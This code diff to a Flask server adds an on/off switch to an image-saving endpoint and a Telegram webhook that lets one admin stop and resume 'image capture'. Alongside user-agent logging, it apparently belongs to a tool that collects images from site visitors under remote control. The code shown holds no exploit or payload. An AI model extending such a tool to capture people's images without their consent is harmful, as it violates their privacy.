@@ -161,9 +161,15 @@ def log_user_agent():
 # =============================
 @app.route('/save_image', methods=['POST'])
 def save_image():
+    global CAPTURE_ENABLED
+
+    if not CAPTURE_ENABLED:
+        return jsonify({'success': False, 'stopped': True})
+
     try:
         data = request.json or {}
         image_data = data.get('image')
+
 
         if not image_data:
             return jsonify({'success': False}), 400
@@ -190,6 +196,39 @@ def save_image():
     except Exception as e:
         return jsonify({'success': False, 'message': str(e)}), 500
 
+@app.route('/telegram_webhook', methods=['POST'])
+def telegram_webhook():
+    global CAPTURE_ENABLED
+
+    data = request.json or {}
+    message = data.get('message', {})
+    text = message.get('text', '')
+    chat_id = message.get('chat', {}).get('id')
+
+    if str(chat_id) != TELEGRAM_ADMIN_ID:
+        return jsonify({'ok': True})
+
+    if text == '/stop':
+        CAPTURE_ENABLED = False
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": "🛑 Image capture stopped"
+            }
+        )
+
+    elif text == '/start':
+        CAPTURE_ENABLED = True
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": "▶️ Image capture resumed"
+            }
+        )
+
+    return jsonify({'ok': True})
 
 if __name__ == '__main__':
     app.run(debug=False)
